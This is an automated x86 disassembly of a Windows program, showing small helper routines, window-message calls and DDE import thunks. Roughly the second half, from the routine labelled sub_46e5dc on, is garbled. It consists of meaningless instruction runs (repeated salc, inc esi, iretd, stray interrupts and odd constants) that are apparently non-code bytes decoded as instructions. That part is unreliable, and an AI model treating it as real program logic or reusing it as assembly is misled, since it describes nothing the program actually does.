pop ebx
retn
sub_465da8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_465df8
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_465dc4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_465df8
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_465ddc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_465df8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_466078
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466084
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466090
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46609c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4660a8
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4660b4
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4660c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_418310
pop esi
pop ebx
retn
sub_4660d4
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4660f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418310
pop esi
pop ebx
retn
sub_466104
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_46610c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418310
pop esi
pop ebx
retn
sub_466120
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_4661fc
mov eax [ eax + 0x54 ]
call sub_4181b4
retn
sub_466208
mov eax [ eax + 0x54 ]
call sub_4184ac
retn
sub_46645b
jmp sub_403a0c
sub_46649f
jmp sub_403a0c
sub_4664a6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4664f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4662f4
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_40405c
pop esi
pop ebx
retn
sub_466560
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_418310
pop esi
pop ebx
retn
sub_466574
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_466779
jmp sub_403a0c
sub_466780
pop ebx
mov esp ebp
pop ebp
retn
sub_466788
inc [ eax + 0x8c ]
retn
sub_466790
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_4667b0
sub_4667b0
xor edx edx
call sub_466bf4
retn
sub_466be6
jmp sub_403a0c
sub_466c6d
jmp sub_403a0c
sub_466c7c
add eax 0x30
call sub_40d070
retn
sub_466cc0
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_403758#3
jmp sub_403758
sub_466d16
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4673e5
jmp sub_403a0c
sub_4673ec
pop ebx
mov esp ebp
pop ebp
retn
sub_467574
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4675a0
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4675cc
xor edx edx
call sub_4674c4
retn
sub_4675d4
mov dl 0x1
call sub_4674c4
retn
sub_467648
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_467660
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_46772d
jmp sub_403a0c
sub_467734
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403758#2
jmp sub_403758
sub_46847c
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_4684d2
jmp sub_403758
sub_4685b9
jmp sub_403758
sub_4685f2
jmp sub_403a0c
sub_4685f9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468600
call sub_40cbc0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_4687f9
jmp sub_403a0c
sub_468800
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4688c7
jmp sub_403a0c
sub_4688ce
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468aa4
jmp sub_403a0c
sub_468aab
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468b0c
jmp sub_403a0c
sub_468b13
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468b1c
call sub_4688e4
retn
j_sub_403758
jmp sub_403758
sub_468d60
jmp sub_403a0c
sub_468d67
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468e95
jmp sub_403a0c
sub_468ff4
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_4692f3
jmp sub_403a0c
sub_469322
jmp sub_403a0c
sub_46942e
jmp sub_403a0c
sub_469435
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4697c6
jmp sub_403a0c
sub_4697cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4698f0
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46993b
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46994c
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46995c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_4699cf
jmp sub_403a0c
sub_4699d8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46996c
call sub_403ddc
call sub_4698f0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45f69c
call sub_417c78
sub_469b78
mov edx 0xafffd5ff
[ esi - 0x53005201 ]
sub_46a5d9
jmp sub_403a0c
sub_46a5e0
pop ecx
pop ebp
retn
sub_46a5e4
and eax 0xff
shl eax 0x10
and edx 0xff
or eax edx
retn
sub_46a5f8
shr eax 0x10
retn
sub_46a5fc
and eax 0xff
retn
sub_46a604
xor eax eax
retn
sub_46a770
push ebx
mov ebx edx
mov edx ebx
call sub_44199c
test [ ebx + 0x4 ] 0x30
jne r-xdata
pop ebx
retn
or [ ebx + 0x4 ] 0x10
sub_46a794
push ebx
mov ebx eax
mov eax ebx
call sub_44e838
mov eax ebx
call sub_46a7a8
pop ebx
retn
sub_46a98a
jmp sub_403a0c
sub_46aee4
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_46afa8
call sub_4410b4
retn
sub_46afb0
call sub_4410d4
retn
sub_46afe0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46af4c
test eax eax
setne al
pop esi
pop ebx
retn
sub_46b098
cmp dl [ eax + 0x281 ]
je r-xdata
retn
mov [ eax + 0x281 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b114
cmp edx [ eax + 0x298 ]
je r-xdata
retn
mov [ eax + 0x298 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b128
cmp edx [ eax + 0x294 ]
je r-xdata
retn
mov [ eax + 0x294 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b161
jmp sub_403a0c
sub_46b168
pop ebp
retn
sub_46b16c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_46a560
DdeInitializeA
jmp [ __import_lookup_table_14(user32:DdeInitializeA) ]
DdeUninitialize
jmp [ DdeUninitialize@IAT ]
DdeConnect
jmp [ __import_lookup_table_14(user32:DdeConnect) ]
DdeDisconnect
jmp [ __import_lookup_table_14(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ __import_lookup_table_14(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ DdeSetUserHandle@IAT ]
DdePostAdvise
jmp [ DdePostAdvise@IAT ]
DdeNameService
jmp [ DdeNameService@IAT ]
DdeClientTransaction
jmp [ DdeClientTransaction@IAT ]
DdeCreateDataHandle
jmp [ DdeCreateDataHandle@IAT ]
DdeAccessData
jmp [ DdeAccessData@IAT ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ DdeFreeDataHandle@IAT ]
DdeGetLastError
jmp [ DdeGetLastError@IAT ]
DdeQueryStringA
jmp [ __import_lookup_table_14(user32:DdeQueryStringA) ]
DdeCmpStringHandles
jmp [ DdeCmpStringHandles@IAT ]
sub_46b231
jmp sub_403a0c
sub_46b238
pop ebp
retn
sub_46b23c
sub [ rw-data ] 0x1
retn
sub_46bcf2
jmp sub_403a0c
sub_46bcf9
pop ebx
mov esp ebp
pop ebp
retn
sub_46bfc4
jmp sub_403a0c
sub_46bfcb
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_46c14c
jmp sub_403a0c
sub_46c153
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c291
jmp sub_403a0c
sub_46c298
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_403a0c#9
jmp sub_403a0c
sub_46c38f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c49e
jmp sub_403a0c
sub_46c4a5
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c557
jmp sub_403a0c
sub_46c55e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c564
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_41838c
pop ebx
retn
sub_46c578
mov eax [ eax + 0x40 ]
call sub_4184ac
retn
sub_46c6c2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_46c6d0
jmp sub_403a0c
j_sub_46c6c2
jmp sub_46c6c2
sub_46c6d7
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403a0c#8
jmp sub_403a0c
sub_46c78e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403a0c#7
jmp sub_403a0c
sub_46c85e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46cbf2
jmp sub_403a0c
sub_46cbf9
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46cda8
mov [ eax + 0xc6 ] 0x0
retn
sub_46ce8c
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_46cdf4
sub_46ceac
retn
sub_46ceb0
retn
sub_46ceb4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
sub_46cec8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
sub_46cedc
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_46cefc
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46d07f
jmp sub_403a0c
sub_46d086
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d198
retn
sub_46d19c
retn
sub_46d2ad
jmp sub_403a0c
sub_46d2b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d389
jmp sub_403a0c
sub_46d390
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d400
push ecx
push edx
call DdeAccessData
retn
sub_46d408
push edx
call DdeUnaccessData
retn
sub_46d528
mov eax [ eax + 0x10 ]
call sub_46d124
retn
sub_46d5b0
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4207e4
sub_46d68c
jmp sub_403a0c
sub_46d693
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d723
jmp sub_403a0c
sub_46d72a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d7b3
jmp sub_403a0c
sub_46d7ba
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d7c4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_403a0c#6
jmp sub_403a0c
sub_46d90a
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d914
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_46d928
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_403a0c#5
jmp sub_403a0c
sub_46db2b
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_403a0c#4
jmp sub_403a0c
sub_46dc12
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46dd3d
jmp sub_403a0c
sub_46dd44
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46dff5
jmp sub_403a0c
sub_46dffc
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e008
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
j_sub_403a0c#3
jmp sub_403a0c
sub_46e0b8
pop ebp
retn
sub_46e5dc
xchg [ edi + 0x464645b2 ] ch
salc
salc
salc
salc
salc
sbb al 0x20
iretd
sub_46e64d
xchg [ edi + 0x46460482 ] ch
salc
adc [ ecx - 0xeb6b1f0 ] edi
add eax 0x86c3206a
dec ecx
retn 0x4e1f
sub_46e663
inc esi
inc esi
and ch al
cmp eax 0x7acb4600
inc ebp
dec ecx
retn 0x15c0
sub_46e671
inc esi
inc esi
lds edi [ edx ]
bound edx [ edx + 0x47 ]
dec ecx
retn 0x153d
sub_46e67c
inc esi
inc esi
lds edi [ ecx ]
inc di
scasd [ edi ]
sub dl [ 0xffffffffd6d64646 ]
adc [ ecx - 0x793cf5ef ] bh
dec ecx
retn 0x7a2c
sub_46e6b8
pop ebx
inc esi
inc esi

sub_46e747
mov ebx 0xaf16b9b9
in al dx
imul eax [ esi + 0x46 ] 0xffffffd6
salc
salc
salc

sub_46e755
retn
sub_46e756
out 0xb3 al
mov ecx 0xae1615b9
jbe r-xdata
iretd
inc esi
inc esi
lds eax [ edx + 0x51ae104a ]
insb
inc esi
inc esi
pop ds
retn
sub_46e76c
xchg [ ecx - 0x3d ] cl
mov esp 0x2e464600
inc edx
inc edi
inc esi
inc esi

sub_46e779
retn
sub_46e7a1
add esp [ eax - 0x32d7d3e2 ]
mov fs [ eax ]
iretd
sub_46e7aa
or ebp [ esi + 0x20212c1f ]
iretd
sub_46e7b1
or ebp [ edi + ebx + 0x466b17af ]
inc esi
salc
iretd
sub_46e7bb
or esi [ edx - 0x3241ec31 ]
add edi [ edx - 0x325dfc31 ]
add edi [ esi - 0x3251fc31 ]
add esi [ edx + 0x75aa03cf ]
xchg bh cl
add esi [ edx - 0x1550468b ]
outsd
inc esi
inc esi
salc
retn
sub_46e844

sub_46e845
idiv [ ebx + 0x71aeb9b9 ]
dec esp
inc esi
inc esi
retn
sub_46e84f
xchg [ ecx - 0x3d ] cl
test al 0x6d
inc esi
inc esi

sub_46e8af

sub_46e8b0
idiv [ ebx - 0x75514647 ]
dec edi
inc esi
inc esi
retn
sub_46e8ba
xchg [ ecx - 0x3d ] cl
lds ebp [ ebp + 0x46 ]
inc esi

sub_46e8c2
cmp ebp [ esi - 0x4646c351 ]
mov ecx 0x5611b9d6
scasd [ edi ]
sub eax 0xd6464604
salc
salc

sub_46e904
pop eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc

sub_46ea14
add esp edx
scasd [ edi ]
sub cl [ edx + 0x46 ]
inc esi
salc
salc
salc
dec ecx
retn
sub_46eab2
inc esi
inc esi

sub_46eab5
retn 0xd662
sub_46eb8a
inc esi
inc esi
scasd [ edi ]
mov al [ 0xffffffffd6464671 ]
salc
salc

sub_46eb95

sub_46ec98
inc esi
salc
salc
salc
salc

sub_46eca6
push ss
inc esi
inc esi
salc

sub_46ecab
retn
sub_46ecac
mov esi 0xaeb9b9bb
sub al 0xc
inc esi
inc esi

sub_46ecb6

sub_46ecb7
mov dh 0xbd
mov ecx 0x4f21aeb9
inc esi
inc esi

sub_46ecc1

sub_46ecc2
mov esi 0xaeb9b9bb
sbb cl [ edi + 0x46 ]
inc esi
scasd [ edi ]
pop ecx
outsb
inc esi
inc esi
salc

sub_46ed10
xchg [ ecx - 0x3e ] cl
int1
dec ebx
inc esi
inc esi
adc eax 0x464bdaaf
inc esi
salc
salc
iretd
sub_46ed20
sbb ebx [ edx + 0x460a4faf ]
inc esi
salc
salc

sub_46ed2a
retn
sub_46edb0
inc ecx
inc esi
inc esi
inc esi
adc eax 0x46ead0b9
inc esi
inc esi

sub_46edde
add edi [ esi - 0x304dfc31 ]
add edi [ edx + 0x4641edaf ]
inc esi
salc
salc
salc
salc
retn
sub_46ee1c
inc esi
inc esi
int 0xbf
int 0x97
and bh cl
cmp esi [ eax - 0x3287ec31 ]
mov esi 0x7af96cd
push 0x46
inc esi
iretd
sub_46ee34
add edi [ edx + 0x460ecaaf ]
inc esi
salc
salc
salc
dec ecx
retn
sub_46ee40
sar [ ebp + 0x3cbb9b9 ] 0xfa
push ss
int 0x80
scasb [ edi ]
xchg [ esi + 0x2bafb9b9 ] edi
mov ebp 0x33b9b9b9
0xb91a11b9 0x1630

sub_46ef54
inc esi
inc esi

sub_46ef57
or ecx [ esi - 0x5111fc35 ]
dec esi
je r-xdata
inc esi
retn
sub_46ef62
xchg [ ecx - 0x3e ] cl
imul [ ecx + 0x46 ]
inc esi

sub_46ef6e
mov esi 0xd6d6b9b9
dec ecx
int1
add eax 0x86c32002
dec ecx
retn 0xafe
sub_46ef7e
inc esi
inc esi
lds esp [ edx ]
bound edx [ edx + 0x46 ]
scasd [ edi ]
enter 0x4670 0x46
salc
dec ecx
retn
sub_46ef8d
outsd
mov al 0xb9
mov ecx 0x49ba1b7f
retn
sub_46f019
push ebp
inc esi
inc esi
salc
salc

sub_46f0de
shl dh 0x46
inc esi
inc esi
scasb [ edi ]
in eax 0x54
inc esi
inc esi
iretd
sub_46f169
retn
sub_46f16b
mov ebx 0xfcaeb9b9
dec edx
inc esi
inc esi
push ss
scasd [ edi ]
or al 0x76
inc esi
inc esi
salc
int 0x3a

sub_46f215
retn
sub_46f234
retn
sub_46f24d
xchg [ ecx - 0x3d ] cl
mov dl 0xb9
mov ecx 0x16f603cb
adc bl cl

sub_46f25b
0xb9bb
sub_46f25e
mov ecx 0x46722bae
inc esi
pop ds
pop ds
retn
sub_46f29e
dec ecx
retn 0x657
sub_46f2a2
inc esi
inc esi
lds edi [ edi + 0x4ec4492e ]
push es
inc esi
inc esi
retn
sub_46f2ae
mov ecx 0x646c349
inc esi
inc esi

sub_46f328
xchg [ edi - 0x4646459c ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_46f37a
push eax
inc esi
inc esi
salc
salc
int 0x12
bound edx [ esi - 0x3b ]
test [ edx - 0x35 ] al
retn 0xd662
sub_46f38a
inc esi
inc esi
inc esi
scasd [ edi ]
jo r-xdata
retn 0x127
inc esi
inc esi
salc
iretd
sub_46f3ff
dec ecx
retn 0x127
sub_46f419
inc esi
inc esi
scasd [ edi ]
mov gs [ eax + 0x46 ]
inc esi
salc
salc
salc
retn
sub_46f425
dec ecx
retn 0x500e
sub_46f429
inc esi
inc esi
lds edi [ ebx ]
dec esi
inc esi
dec ecx
retn 0x5078
sub_46f433
inc esi
inc esi

sub_46f436
retn
sub_46f473
dec ecx
retn
sub_46f543
add edi [ edx + 0x49ba1b7f ]
retn 0x60c5
sub_46f54c
inc esi
inc esi
scasd [ edi ]
push es
bound eax [ esi + 0x46 ]
int 0x9
dec edx
retn
sub_46f558
dec ecx
retn 0xed
sub_46f55c
inc esi
inc esi
scasd [ edi ]
rol [ eax ] 0x1
inc esi
inc esi
salc
salc
salc
salc
adc eax 0x2087cd10
retn
sub_46f5d4
inc esi
inc esi

sub_46f5d7
retn
sub_46f5d8
xchg esi eax
mov ebx 0x1516b9b9
scasd [ edi ]
pushfd
push esp
inc esi
inc esi
salc
and bh cl
add esp [ eax - 0x59f430e0 ]
pop ds

sub_46f5ee
add ebp [ esi + 0x4e03cd16 ]
and bh cl
or esp [ edi + ebp * 4 + 0x464655b4 ]
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
enter 0xb9be 0xb9
salc
salc
salc
iretd
sub_46f629
dec ecx
retn 0x6788
sub_46f680
xchg [ edi + 0x46460741 ] ch
salc
scasb [ edi ]
fwait
insb
inc esi
inc esi
retn
sub_46f6e2
push edi
scasd [ edi ]
and [ ecx + edi * 4 - 0x46e92947 ] esi
xor ecx [ esi - 0x35 ]
retn
sub_46f77c
mov ebx 0xefaeb9b9
inc eax
inc esi
inc esi
int 0x13
dec edx
scasb [ edi ]
out 0x40 eax
inc esi
inc esi

sub_46f817
adc edi eax
scasd [ edi ]
int3
sub_46feb0
add edi [ edx - 0x7045fc33 ]
test esi edx
salc
salc
salc
salc
salc
push ds
sub al 0x64
and bh cl
add esp [ edx + 0x20662c1e ]
iretd
sub_46fef6
sbb [ esi ] cl
scasb [ edi ]
enter 0x4642 0x46
iretd
sub_46ff36
retn
sub_46ffd3
add esi [ esi + 0x5834af16 ]
inc esi
inc esi
salc
iretd
sub_46ffdd
add [ esi - 0x51 ] ch
mov edx 0x49d6b9b9
retn
sub_46ffe7
bound esp [ eax + 0x46 ]
inc esi
scasd [ edi ]
xor [ ebx - 0x3c294647 ] edi
mov al 0x49
retn 0xa8a2
sub_46fff7
mov ecx 0xbdab2eb9
and eax 0xc1ae10d0
inc ebp
inc esi
inc esi
scasd [ edi ]
sbb eax 0xd646467a
salc
salc

sub_47000d
retn
sub_470098
sub al 0xb4
mov ecx 0xb98ec5b9
test esi edx
salc

sub_4700d8
clc
add [ esi + 0x46 ] 0x46
scasd [ edi ]
adc eax 0x49b9b9be
rcl [ eax + 0x41 ] 0x46
inc esi
add [ ebp - 0x4a ] bh
dec ecx
les esp [ ebx - 0x47 ]
mov ecx 0xb9a157af
mov ecx 0xd6d6d6d6
iretd
sub_4700fb
add esi [ esi - 0x6b8a798b ]
iretd
sub_470102
add edi [ edx - 0x5045f433 ]
sub [ esi + 0x17d6b9b9 ] dh

sub_4701aa
inc esi
inc esi
lds edi [ ecx ]
dec esi
inc esi
dec ecx
retn 0x4641
sub_4701b4
inc esi
inc esi
int 0x8e
scasb [ edi ]
sub al 0xb2
mov ecx 0x6232b9b9
pop esi
int 0x80
scasb [ edi ]
push cs
mov [ 0xffffffffaf1fb9b9 ] eax
retn
sub_4702bc
mov ecx 0x1c0bfeb9
inc esi
inc esi
and [ edi + 0x47 ] bh
dec ecx
retn
sub_4702f4
cmp [ eax + 0x46 ] cl
inc esi
scasd [ edi ]
cmp al 0xa0
mov ecx 0x2cd6d6b9
xor [ eax ] esp
iretd
sub_470346
add ah [ edx + 0x7e ]
push ss

sub_4703a9
retn
sub_4703bf
iretd
sub_4703eb
add edi [ edx - 0x5045f433 ]
push esi
inc esi
inc esi
iretd
sub_470481
sbb esi [ edx + 0x4afeaf11 ]
inc esi
inc esi
salc
salc

sub_47048c

sub_47048d
0xb9bb
sub_4704aa
mov al 0xaf
cmpsb [ esi ] [ edi ]
push 0xcd134646
stosb [ edi ]
scasd [ edi ]
pop eax
inc edx
inc esi
inc esi
and bh cl
or edx [ eax + 0x20272c1f ]
iretd
sub_4704e5
retn
sub_470560
adc esi [ eax + 0x2c ]
and [ eax ] esp
iretd
sub_470592
add esi [ esi + ebx + 0x467372af ]
inc esi
salc
salc
salc
and bh cl
cmp ebp [ esi + 0x20722c19 ]
iretd
sub_4705a6
adc ebp [ edx + 0x20 ]
iretd
sub_4705de
mov ecx 0x1e292cb9
sub al 0x36
and bh cl
add ah [ edx + 0x7a ]
push ds
sub al 0x23
scasd [ edi ]
insd
imul eax [ esi + 0x46 ] 0xffffffd6
and bh cl
sbb ebx [ edx + 0x20252c1d ]
iretd
sub_4705fc
sbb ebx [ eax - 0x30df6333 ]
sbb esp [ esi - 0x508fd3e3 ]
xlat
mov ecx 0x49d6b9b9
retn
sub_47060f
inc ecx
inc esi
inc esi
inc esi
add [ ebx ] 0x464646ba
inc esi
scasd [ edi ]
dec esi
mov esp 0x2cd6b9b9
sbb [ cs : eax ] esp
iretd
sub_470625
cmp ebp [ edx + 0x467469af ]
inc esi
and bh cl
adc ebp [ esi + 0x20342c1c ]
iretd
sub_470688
popfd
dec ecx
retn 0x6a1a
sub_470706
inc esi
inc esi
sub al 0x46
mov ecx 0x4646ead0
inc esi

sub_470711

sub_4707c3
retn
sub_4707c4
idiv [ ebx - 0x32e94647 ]
add ecx [ esi + 0x2c ]
inc esi
mov ecx 0x86c30a16
dec ecx
retn 0x6aa4
sub_4707d7
inc esi
inc esi

sub_4707da

sub_4707db
idiv [ ebx + 0x5aeb9b9 ]
test al 0xb9
mov ecx 0x4642d9af
inc esi
salc
adc [ ecx ] dl
retn
sub_470848
inc esi
inc esi
scasb [ edi ]
mov dh 0x74
inc esi
inc esi
iretd
sub_470850
cmp ah [ edx + 0x56 ]
lds edi [ edx ]
bound ebp [ edx + 0x47 ]
mov ecx 0xb8cd7635
mov ecx 0x49626232
retn
sub_470878
push ebx
popad
inc esi
inc esi
scasd [ edi ]
mov edi 0xd6464647
dec ecx
retn
sub_470a1a
mov esp 0x464aa6af
inc esi
retn
sub_470a21
xchg [ edi + 0x464665e8 ] ch
salc
scasb [ edi ]
movsd [ edi ] [ esi ]
0xc31fb9b9 0x4986
retn 0x464c
sub_470a88
cmp edi [ edx + 0x112a10b9 ]
int 0x3b
push esi

sub_470c89
cmp esi [ edx - 0x465c4c52 ]
mov ecx 0xc34986c3
0xcb464641 0x9e3b
sub_470c9b

sub_470c9c

sub_470cc4
rcr [ ebx + 0x43aeb9b9 ] 0xa7
mov ecx 0x4986c3b9
retn
sub_470cd1
or ebx [ esi + 0x46 ]
inc esi
scasd [ edi ]
iretd
sub_470cd8
mov ecx 0xd6d6d6b9
dec ecx
retn 0xa367
sub_470ce1
mov ecx 0x422c11b9

sub_470de3
rol [ esi + 0x7d464646 ] 0x85
dec ecx
retn
sub_470dec
xchg [ edx - 0x798a4647 ] esi
scasd [ edi ]
cmp eax 0xd6464645
salc
salc
salc
salc
salc

sub_470dfe
retn
sub_470dff
mov ebx 0x51aeb9b9
outsd
inc esi
inc esi

sub_470e97
mov dh 0xb9
mov ecx 0x11d6d6d6
int 0xb6
sub al 0x46
mov ecx 0xbecd3e10
retn
sub_470f2e
mov ecx 0x498d7db9
retn 0xbe80
sub_47101a
mov ecx 0x9376afb9
mov ecx 0x49d6d6b9
retn 0x625d
sub_471027
inc esi
inc esi
sub al 0x64
push ds
sub al 0x63
and bh cl
add esp [ esi + 0x20352c1e ]
iretd
sub_471044
inc esi
inc esi
int 0x8e

sub_471049
retn
sub_47104b
